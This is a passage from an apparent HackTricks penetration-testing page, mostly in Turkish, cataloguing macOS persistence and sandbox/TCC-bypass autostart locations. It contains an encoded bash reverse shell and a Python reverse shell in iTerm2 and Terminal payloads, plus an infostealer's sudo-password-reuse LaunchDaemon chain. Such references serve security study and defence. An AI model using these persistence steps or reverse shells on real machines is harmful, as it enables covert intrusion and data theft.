# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanmaktadır. Amaç, **daha fazla Autostart Location** eklemek (mümkünse), en son macOS sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya root izinlerine ihtiyaç duymadan sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek bir şeyi kolayca çalıştırmanıza olanak tanır.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root gerekli
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root gerekli
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root gerekli
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root gerekli
- **`~/Library/LaunchAgents`**
- **Trigger**: Tekrar giriş
- **`~/Library/LaunchDemons`**
- **Trigger**: Tekrar giriş

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`**, Mach-o bölümündeki `__Text.__config` içinde gömülü bir property list bulundurur. Bu liste, launchd'nin başlatması gereken diğer iyi bilinen servisleri içerir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` özelliklerini içerebilir.
>
> Elbette code signing nedeniyle değiştirilemez.

#### Description & Exploitation

**`launchd`**, başlangıç sırasında OX S kernel tarafından çalıştırılan **ilk** **process** ve kapanma sırasında tamamlanan son process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlardaki **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agents
- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemons
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agents.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemons.

Bir kullanıcı giriş yaptığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist dosyaları **giriş yapan kullanıcının izinleriyle** başlatılır.

**Agents ve daemons arasındaki temel fark, agents kullanıcı giriş yaptığında, daemons ise sistem başlangıcında yüklenir** (örneğin ssh gibi, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gereken servisler vardır). Ayrıca agents GUI kullanabilirken daemons arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**kullanıcı giriş yapmadan önce bir agent'ın çalıştırılması gerektiği** durumlar vardır; bunlara **PreLoginAgents** adı verilir. Örneğin bu, giriş sırasında yardımcı teknolojiler sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` içinde bulunabilir (bir örnek için [**buraya**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bakın).

> [!TIP]
> Yeni Daemons veya Agents config dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir**. **.plist dosyalarını bu uzantı olmadan yüklemek de mümkündür**: `launchctl -F <file>` (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` **kullanılarak kaldırılmaları da mümkündür** (dosyanın işaret ettiği process sonlandırılır).
>
> Bir **Agent** veya **Daemon'ın çalışmasını engelleyen** herhangi bir şeyin (**override** gibi) **bulunmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm agent ve daemon'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (password reuse)

Yakın zamanda görülen bir macOS infostealer, bir **captured sudo password** kullanarak bir user agent ve root LaunchDaemon oluşturdu:<sup>[[1]](#references)</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hâle getirin.
- Bu agent'ı hedefleyen bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan password'ü `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde bulunsa bile **task root olarak değil, kullanıcı olarak yürütülür**. Bu durum bazı privilege escalation saldırılarını engelleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan ilk **user mode** process'tir. Process'in başlatılması **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Hatta bazı **killing signal**'lara karşı **korumalıdır**.

`launchd`'nin yapacağı ilk şeylerden biri, aşağıdaki tüm **daemon**'ları **başlatmaktır**:

- Çalıştırılma zamanına dayalı **Timer daemon**'ları:
- atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak üzere `StartCalendarInterval` değerine sahiptir
- **Network daemon**'ları:
- `org.cups.cups-lpd`: `printer` değerindeki `SockServiceName` ile TCP (`SockType: stream`) üzerinde dinleme yapar
- SockServiceName bir port veya `/etc/services` içindeki bir service olmalıdır
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
- Belirtilen bir path değiştiğinde çalıştırılan **Path daemon**'ları:
- `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
- **IOKit notifications daemon**'ları:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adının belirtildiğini gösterir
- **UserEventAgent:**
- Bu, önceki olandan farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP tarafından kısıtlanan `/System/Library/UserEventPlugins/` klasöründeki plugin'leri yükler; her plugin initializer'ını `XPCEventModuleInitializer` key'inde veya eski plugin'lerde, `Info.plist` dosyasındaki `CFPluginFactories` dict'i altında `FB86416D-6164-2070-726F-70735C216EC0` key'inde belirtir.

### shell startup dosyaları

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell'i çalıştıran, TCC bypass'a sahip bir app bulmanız gerekir

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açma
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açma
- Root gerektirir
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkma
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkma
- Root gerektirir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açma
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile tetiklenmesi beklenir, ancak **installed** değildir ve installed edildikten sonra bile şu hata verilir: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell environment başlatıldığında, **belirli startup dosyaları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Bu shell, Terminal application başlatıldığında veya bir device SSH üzerinden erişildiğinde otomatik olarak açılır. macOS'ta `bash` ve `sh` de bulunur, ancak kullanılmaları için açıkça invoke edilmeleri gerekir.<sup>[[2]](#references)</sup>

`man zsh` komutuyla okuyabileceğimiz zsh man page'i, startup dosyalarının uzun bir açıklamasını içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation yapılandırılıp oturum kapatılıp yeniden açıldığında veya hatta yeniden başlatıldığında, test sırasında uygulama çalıştırılmadı. Bu işlemler gerçekleştirilirken uygulamanın çalışıyor olması gerekebilir.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Yeniden başlatıldığında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir<sup>[[4]](#references)</sup>

Bu nedenle, yeniden açılacak uygulamaların kendi uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye **bir uygulama eklemek** için şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, onu kullanan kullanıcının FDA izinlerine sahip olur

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i aç

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde, Applications uygulamalarındaki kullanıcının tercihleri depolanır. Bu tercihlerden bazıları **diğer uygulamaları/script'leri execute etmek** için bir configuration içerebilir.<sup>[[5]](#references)</sup>

Örneğin Terminal, Startup sırasında bir command execute edebilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu config, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki terminal tercihlerinin plist dosyası üzerine yazılabilirse, **`open`** işlevi **terminali açmak ve bu komutu çalıştırmak** için kullanılabilir.

Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Kullanıcının FDA izinlerine sahip Terminal'i kullanmak

#### Konum

- **Anywhere**
- **Trigger**: Terminal'i aç

#### Açıklama ve Exploitation

Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal uygulaması** otomatik olarak çağrılır ve içindeki belirtilen komutları çalıştırır. Terminal uygulamasının bazı özel ayrıcalıkları varsa (TCC gibi), komutunuz bu özel ayrıcalıklarla çalıştırılır.

Şununla deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> Terminal **Full Disk Access**'e sahipse bu işlemi tamamlayabilir (yürütülen komutun bir terminal penceresinde görünür olacağını unutmayın).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`~/Library/Audio/Plug-ins/Components`**
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/System/Library/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın

#### Açıklama

Önceki writeup'lara göre bazı audio plugin'lerini **compile etmek** ve yüklenmelerini sağlamak mümkündür.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

QuickLook plugin'leri, bir dosyanın **önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve bu dosya türünü destekleyen bir **plugin** yüklü olduğunda çalıştırılabilir.<sup>[[8]](#references)</sup>

Kendi QuickLook plugin'inizi compile etmek, yüklenmesi için önceki konumlardan birine yerleştirmek ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basmak mümkündür.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bu işlem ne kullanıcı LoginHook'u ne de root LogoutHook'u ile bende çalıştı.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` benzeri bir şeyi çalıştırabilmeniz gerekir
- `~/Library/Preferences/com.apple.loginwindow.plist`` konumunda bulunur

Kullanımdan kaldırılmıştır, ancak bir kullanıcı giriş yaptığında komutları çalıştırmak için kullanılabilirler.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde depolanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcınınki **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** konumunda saklanır.

## Conditional Sandbox Bypass

> [!TIP]
> Burada, yalnızca bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların yüklü olması**, **“alışılmadık” kullanıcı** eylemleri veya ortamlar gibi çok yaygın olmayan koşullar beklemenize olanak tanıyan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- **sandbox bypass** için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `crontab` binary'sini çalıştırabiliyor olmanız gerekir
- Veya root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gerekir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Tetikleyici**: Cron job'ına bağlıdır

#### Açıklama ve Exploitation

**Mevcut kullanıcının** cron job'larını şununla listeleyin:
```bash
crontab -l
```
Kullanıcıların tüm cron jobs’larını **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** dizinlerinde de görebilirsiniz (root gerekir).

MacOS’ta **belirli sıklıklarla** script çalıştıran çeşitli klasörler şuralarda bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada normal **cron** **işlerini**, **at** **işlerini** (çok kullanılmaz) ve **periodic** **işlerini** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulabilirsiniz. Günlük periodic işleri örneğin şu komutla çalıştırılabilir: `periodic daily`.<sup>[[10]](#references)</sup>

**Kullanıcı cronjob'ı programatik olarak** eklemek için şu kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 daha önce verilmiş TCC izinlerini kullanır

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i açma

#### Açıklama ve Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan script'ler çalıştırılır. Örneğin:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** betiği de çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komut belirtebilir**.

Bu ayar iTerm2 settings bölümünden yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut, tercihlerde şu şekilde yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Çalıştırılacak komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**'ı kötüye kullanarak arbitrary commands çalıştırmanın başka yollarının olması oldukça muhtemeldir.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar'ın kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Popüler [**xbar**](https://github.com/matryer/xbar) programı kuruluysa, xbar başlatıldığında çalıştırılacak bir shell script'i **`~/Library/Application\ Support/xbar/plugins/`** dizinine yazmak mümkündür:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **macOS** üzerinde **LUA scripting language** kullanan bir automation platformudur. Özellikle tam AppleScript kodunun entegre edilmesini ve shell scripts çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[[13]](#references)</sup>

Uygulama tek bir dosyayı, `~/.hammerspoon/init.lua`, arar ve başlatıldığında script çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool yüklü olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollara basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir saldırgan, **veritabanında kendi kısayolunu ve çalıştırılacak action'ı yapılandırarak** arbitrary code çalıştırılmasını sağlayabilir (kısayol yalnızca bir tuşa basmak olabilir).

### Alfred

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred yüklü olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinlerini ister

#### Konum

- `???`

Belirli koşullar karşılandığında code çalıştırabilen workflow'lar oluşturulmasına olanak tanır. Bir saldırganın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması potansiyel olarak mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA access elde etmek için kullanılır

#### Konum

- **`~/.ssh/rc`**
- **Tetikleyici**: ssh ile giriş
- **`/etc/ssh/sshrc`**
- Root gerektirir
- **Tetikleyici**: ssh ile giriş

> [!CAUTION]
> ssh'yi etkinleştirmek için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH üzerinden giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak argümanlarla birlikte `osascript` çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Tetikleyici:** Giriş
- `osascript` çağrılarak çalıştırılan exploit payload'ı burada saklanır
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Tetikleyici:** Giriş
- Root gerektirir

#### Açıklama

System Preferences -> Users & Groups -> **Login Items** bölümünde, **kullanıcı giriş yaptığında çalıştırılacak öğeleri** bulabilirsiniz.\
